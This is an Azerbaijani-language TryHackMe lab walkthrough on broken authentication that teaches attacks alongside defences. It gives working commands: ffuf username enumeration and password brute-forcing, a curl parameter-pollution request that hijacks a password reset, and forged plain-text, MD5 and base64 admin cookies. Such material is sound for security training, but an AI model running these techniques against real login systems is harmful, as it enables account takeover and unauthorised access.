# 🔐 Broken Authentication — TryHackMe Otağı
### Azerbaycanca Təhsil Materialı | Anlamaq üçün hazırlanmışdır

---

## 📖 Bu Material Haqqında

Bu material TryHackMe-nin **Broken Authentication** otağını sırf tapşırıq cavabı kimi deyil, **konseptləri anlamaq** üçün izah edir. Hər bölmədə **nə baş verir**, **niyə baş verir** və **real həyatda nə demək olduğu** açıqlanır.

---

## 🗂️ Mündəricat

1. [Authentication Nədir?](#authentication-nədir)
2. [Username Enumeration](#username-enumeration)
3. [Brute Force Hücumu](#brute-force-hücumu)
4. [Logic Flaw — Məntiqi Qüsurlar](#logic-flaw--məntiqi-qüsurlar)
5. [Cookie Manipulyasiyası](#cookie-manipulyasiyası)
6. [Ümumi Dərs və Müdafiə Yolları](#ümumi-dərs-və-müdafiə-yolları)

---

## 1. Authentication Nədir?

**Authentication** (autentifikasiya) — sistemin "sən kimsən?" sualına cavab aldığı prosesdir.

Gündəlik həyatdan misal: Bankda kassir sənin pasportunuzu yoxlayır. Pasport düzgündürsə, əməliyyat icazəsi verilir. Pasport saxtadırsa, rədd edilir. Veb tətbiqlərdə də eyni prinsip işləyir — amma burada "pasport" əvəzinə istifadəçi adı və şifrə istifadə olunur.

**Broken Authentication** isə bu yoxlama mexanizminin düzgün işləmədiyi vəziyyətdir. Haker düzgün etimadnamə olmadan sistemə daxil olur — sanki bankda kassir pasportu heç yoxlamır.

### Niyə Bu Qədər Geniş Yayılmışdır?

- Developerlər autentifikasiyanı özləri yazırlar — standart kitabxana yox
- Hər proqramın öz "giriş məntiqi" var
- Kiçik bir nəzər yetirməmə böyük boşluğa çevrilir
- Avtomatik skanerlər bu tip səhvləri tapa bilmir — insan testi lazımdır

---

## 2. Username Enumeration

### Konsept: Sistem Çox Şey Danışır

İstifadəçi adı enumeration (sadalama) o deməkdir ki, tətbiq fərqli xəta mesajları göndərərək **hansı istifadəçi adlarının mövcud olduğunu** bilmədən açıqlayır.

**Problem olan nümunə:**
- Mövcud olmayan istifadəçi: *"Bu istifadəçi adı tapılmadı"*
- Mövcud istifadəçi, yanlış şifrə: *"Şifrə yanlışdır"*

Bu iki fərqli mesaj hakerin işini asanlaşdırır. Haker bilir ki, ikinci mesaj gəldikdə istifadəçi adı düzgündür — yalnız şifrəni tapmaq qalır.

**Düzgün olan nümunə:**
- Hər iki halda eyni mesaj: *"İstifadəçi adı və ya şifrə yanlışdır"*

Bu halda haker heç nə öyrənə bilmir.

### Qeydiyyat Formasında Eyni Problem

Qeydiyyat forması da məlumat sızdıra bilər:
- *"Bu istifadəçi adı artıq mövcuddur"* — haker bunu görüb istifadəçini tapır

### ffuf Aləti ilə Praktiki Nümunə

`ffuf` — HTTP sorğularını avtomatlaşdıran fuzzing alətidir. Min istifadəçi adını saniyələr içində sınayır.

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://HEDEF/customers/signup \
     -mr "username already exists"
```

**Əmrin izahı:**
| Parametr | Mənası |
|---|---|
| `-w` | Wordlist faylı — sınanacaq istifadəçi adları |
| `-X POST` | POST sorğusu göndər |
| `-d` | POST body-si — `FUZZ` əvəzinə wordlistdən dəyər gəlir |
| `-H` | Header — formanın content-type-ını bildiririk |
| `-u` | Hədəf URL |
| `-mr` | Match regex — bu mətni görürsənsə, nəticəni göstər |

**Nəticə:** Mövcud olan istifadəçi adları tapılır — bunlar brute force üçün istifadə olunacaq.

---

## 3. Brute Force Hücumu

### Konsept: Bütün Kombinasiyaları Sına

Brute force — mümkün olan bütün şifrə kombinasiyalarını sistemli şəkildə sınamaqdır. Kiçik istifadəçi adı siyahısı + ümumi şifrə siyahısı = məqsədyönlü hücum.

**Riyaziyyat:**
- 3 istifadəçi adı × 100 şifrə = **300 cəhd** → saniyələr içində
- 10.000 istifadəçi adı × 100 şifrə = **1.000.000 cəhd** → yavaş, şübhəli

Bu səbəbdən enumeration addımı vacibdir — böyük siyahı yerinə kiçik, dəqiq siyahı istifadə etmək hücumu daha effektiv edir.

### Uğur Siqnalı: HTTP Status Kodları

Hər brute force aləti **uğurlu girişi uğursuzdan ayırd etməyi** bacarmalıdır.

Bu tətbiqdə:
- **HTTP 200** → giriş uğursuz, login səhifəsi yenidən göstərilir
- **HTTP 302** → giriş uğurlu, dashboard-a yönləndirilir

Biz 200-ləri filtrləyib yalnız 302-ni görəcəyik.

### ffuf ilə İki Wordlist

```bash
ffuf -w valid_usernames.txt:W1,\
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST \
     -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://HEDEF/customers/login \
     -fc 200
```

**Əmrin izahı:**
| Parametr | Mənası |
|---|---|
| `W1:W2` | İki ayrı wordlist, hər biri öz markeri ilə |
| `-fc 200` | Filter code — 200 statuslu cavabları gizlət |

**Nəticə:** Yalnız 302 statuslu bir cavab görünür → bu uğurlu giriş deməkdir → istifadəçi adı + şifrə tapıldı.

### Müdafiə Yolları

- **Rate limiting** — bir IP-dən çox cəhdi blokla
- **Account lockout** — 5 yanlış cəhddən sonra hesabı kilit
- **CAPTCHA** — avtomatik sorğuları tanı
- **Multi-Factor Authentication** — şifrə tək başına kifayət etməsin

---

## 4. Logic Flaw — Məntiqi Qüsurlar

### Konsept: Qaydalar Bir-Birinə Ziddir

Logic flaw (məntiqi qüsur) ən çətin anlaşılan boşluq növüdür. Haker heç nəyi "sındırmır" — sistemin öz qaydalarını bir-birinə qarşı işlədir.

**Fərq:**
- SQL injection → sistemi yanlış məlumatla aldatmaq
- Logic flaw → sistemi öz doğru məlumatı ilə aldatmaq

### Nümunə 1: Hərif Hissiyatı (Case Sensitivity)

```javascript
if (url.substr(0, 6) === '/admin') {
    // Admin yoxlaması
} else {
    // Səhifəni göstər
}
```

Bu kod `/admin` üçün yoxlama edir. Amma router `/adMin`-i də `/admin` kimi qəbul edir.

- `/admin` → yoxlama var ✅
- `/adMin` → router qəbul edir, kod yoxlama etmir ❌

**Niyə?** Routing framework hərif hissiyatsızdır, amma yoxlama kodu `===` ilə tam uyğunluq axtarır. İki hissə razılaşmır → boşluq yaranır.

**Dərs:** Sistemin hər hissəsi eyni qaydaları eyni cür tətbiq etməlidir.

---

### Nümunə 2: Şifrə Sıfırlama — Parameter Pollution

Bu ən maraqlı hücum növüdür. Sadə görünən şifrə sıfırlama formasında ciddi boşluq gizlənib.

#### Normal Axış

1. İstifadəçi e-mailini daxil edir → `robert@acmeitsupport.thm`
2. İstifadəçi adını daxil edir → `robert`
3. Sistem `robert`-in e-mailinə sıfırlama linki göndərir ✅

Görünüşdə mükəmməldir. Amma...

#### Texniki Problem: `$_REQUEST` Superglobal

PHP-nin `$_REQUEST` dəyişkəni **URL query string**, **POST body** və **cookie**-lərdən gələn məlumatları birləşdirir. Eyni açar bir neçə yerdə varsa — **POST body qalib gəlir**.

**Normal sorğu:**
```
URL:  ?email=robert@acmeitsupport.thm
BODY: username=robert
```

Sistem URL-dəki email ilə hesabı tapır, POST body-dəki username ilə təsdiq edir, linki `robert`-in emailinə göndərir.

**Hücum sorğusu:**
```
URL:  ?email=robert@acmeitsupport.thm
BODY: username=robert&email=haker@haker.com
```

- Sistem URL-dəki `robert@acmeitsupport.thm` ilə **robert**-i tapır ✅
- `$_REQUEST`-dəki `email` dəyərini oxuyur — amma body-dəki `haker@haker.com` qalib gəlir
- Link **hakerin emailinə** göndərilir! ❌

#### Hücumun Addımları

**1. Özünə hesab aç:**
```
http://HEDEF/customers/signup
```
Məsələn: `testuser` adı ilə qeydiyyat keç.

**2. curl ilə hücumu icra et:**
```bash
curl 'http://HEDEF/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email=testuser@customer.acmeitsupport.thm'
```

**3. Öz hesabına gir, Support Tickets-ə bax:**
Robert-in şifrə sıfırlama linki sənin ticketinə gəlir → linki aç → Robert kimi daxil olursan → onun ticketlərindəki flaqı götürürsən 🚩

#### Niyə Bu Baş Verir?

Developer iki fərqli qaynaqdan (URL və POST body) gələn `email` parametrinin birini digərinin üzərinə yaza biləcəyini düşünməyib. Hər iki qaynaq "düzgün" məlumat göndərir — sistem isə yanlış qaynaqdan istifadə edir.

---

## 5. Cookie Manipulyasiyası

### Konsept: HTTP Yaddaşsızdır

HTTP protokolu **stateless** (vəziyyətsiz) protokoldur. Hər sorğu tamamilə müstəqildir — server əvvəlki sorğunu "unutur".

**Problem:** Sən daxil olsan belə, növbəti klikdə server seni tanımır.

**Həll:** Cookie — server sənə kiçik məlumat parçası verir, brauzer onu hər sorğuda geri göndərir, server seni tanıyır.

**Əsas boşluq:** Cookie kriptoqrafik imza ilə qorunmayıbsa, sən onu dəyişə bilərsən və server anlaya bilmir.

---

### Cookie Növ 1: Sadə Mətn

```
Set-Cookie: logged_in=true; admin=false
```

Bu cookie-ni görmək və dəyişmək üçün heç bir texniki bilik lazım deyil. Brauzer developer tools-u kifayətdir.

```bash
# Normal istifadəçi
curl -H "Cookie: logged_in=true; admin=false" http://HEDEF/cookie-test
# Nəticə: "Logged in as user"

# Cookie dəyişdirildi — admin=true
curl -H "Cookie: logged_in=true; admin=true" http://HEDEF/cookie-test
# Nəticə: FLAG! 🚩
```

**Dərs:** Cookie-nin içindəki dəyərlərə heç vaxt etibarlı məlumat kimi baxma. Server tərəfindəki sessiyada saxla.

---

### Cookie Növ 2: Hash Cookie

Bəzi developerlər dəyəri hash edirlər:
```
admin=c4ca4238a0b923820dcc509a6f75849b
```

Bu `1`-in MD5 hash-idir. Developer düşünür ki, hash geri çevrilə bilməz — haker dəyişdirə bilməz.

**Bu fərziyyə yanlışdır!**

Hash şifrələmə deyil — **barmaq izi**dir. Eyni giriş həmişə eyni çıxışı verir. [crackstation.net](https://crackstation.net) kimi saytlarda milyardlarla əvvəlcədən hesablanmış hash var.

**Hücum:**
1. `c4ca4238...` hash-ini CrackStation-a yapışdır → `1` tapılır
2. `true`-nun hash-ini hesabla: `b326b5062b2f0e69046810717534cb09`
3. Cookie-dəki dəyəri əvəz et → admin olursan

**Dərs:** Hash imza deyil. Bütövlüyü qorumaq üçün HMAC kimi imzalama mexanizmi istifadə et.

---

### Cookie Növ 3: Base64 Kodlaşdırma

```
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
```

Base64 — məlumatı xüsusi simvollarla (A-Z, a-z, 0-9, +, /) kodlaşdıran üsuldur. Şifrələmə **deyil** — sadəcə format çevirmə.

```bash
# Decode et
echo "eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==" | base64 -d
# Nəticə: {"id":1,"admin":false}

# Dəyişdir
echo '{"id":1,"admin":true}' | base64
# Nəticə: eyJpZCI6MSwiYWRtaW4iOnRydWV9

# Yeni cookie ilə sorğu
curl -H "Cookie: session=eyJpZCI6MSwiYWRtaW4iOnRydWV9" http://HEDEF/cookie-test
# Nəticə: Admin erişimi! 🚩
```

**Dərs:** Base64 məxfilik vermir. Həssas sessiya məlumatlarını server tərəfində saxla, cookie-də yalnız random sessiya ID-si saxla.

---

## 6. Ümumi Dərs və Müdafiə Yolları

### 🎯 Broken Authentication-ın Əsas Səbəbləri

| Problem | Nümunə | Həll |
|---|---|---|
| Fərqli xəta mesajları | "İstifadəçi tapılmadı" vs "Şifrə yanlış" | Eyni mesaj göndər |
| Brute force qoruması yoxdur | Sınırsız giriş cəhdi | Rate limiting, lockout |
| Məntiqi uyuşmazlıq | `$_REQUEST` qarışıqlığı | Yalnız bir qaynaqdan oxu |
| Cookie imzalanmayıb | `admin=true` sadə mətn | HMAC imza + server sessiyası |
| Hash = şifrə | MD5 hash cookie-də | Kriptoqrafik imza istifadə et |
| Base64 = şifrələmə | JSON base64 cookie-də | Server tərəfli sessiya idarəsi |

---

### 🛡️ Düzgün Autentifikasiya Üçün Prinsiplər

**1. Sessiya idarəsi:**
- Cookie-də heç vaxt həssas məlumat saxlama
- Yalnız random, uzun sessiya ID-si istifadə et
- Server tərəfindəki verilənlər bazasında sessiya məlumatını saxla

**2. Giriş formaları:**
- Uğurlu və uğursuz cəhdlər üçün eyni cavab vaxtı
- Eyni xəta mesajı (mövcud/mövcud olmayan istifadəçi fərqi göstərmə)
- Sınırsız cəhdi blokla

**3. Şifrə sıfırlama:**
- Token-i bir dəfəlik et və qısa müddətli et (15-30 dəq)
- Yalnız bir qaynaqdan giriş al — qarışdırma
- Tokeni e-maildə göndər, URL-də yox

**4. Cookie təhlükəsizliyi:**
- `HttpOnly` — JavaScript cookie-yə çata bilməsin
- `Secure` — yalnız HTTPS üzərindən göndərilsin
- `SameSite` — CSRF hücumlarına qarşı qoruma
- İmza — `HMAC-SHA256` ilə cookie-ni imzala

---

### 📚 Bu Otaqdan Öyrəndiklərimiz

```
Authentication Zəiflikləri
├── Username Enumeration
│   └── Fərqli xəta mesajları → istifadəçi adlarını sızdırır
├── Brute Force
│   └── Kiçik + dəqiq siyahı → sürətli hücum
├── Logic Flaw
│   ├── Case sensitivity uyuşmazlığı → bypass
│   └── Parameter pollution → $REQUEST qarışıqlığı
└── Cookie Manipulation
    ├── Plain text → birbaşa dəyiş
    ├── Hash → CrackStation ilə geri çevir
    └── Base64 → decode → dəyiş → encode
```

---

*Bu material TryHackMe "Broken Authentication" otağı əsasında hazırlanmışdır.*
*Məqsəd: Anlayaraq öyrənmək, yadda saxlamaq, müdafiə mexanizmlərini dərk etmək.*
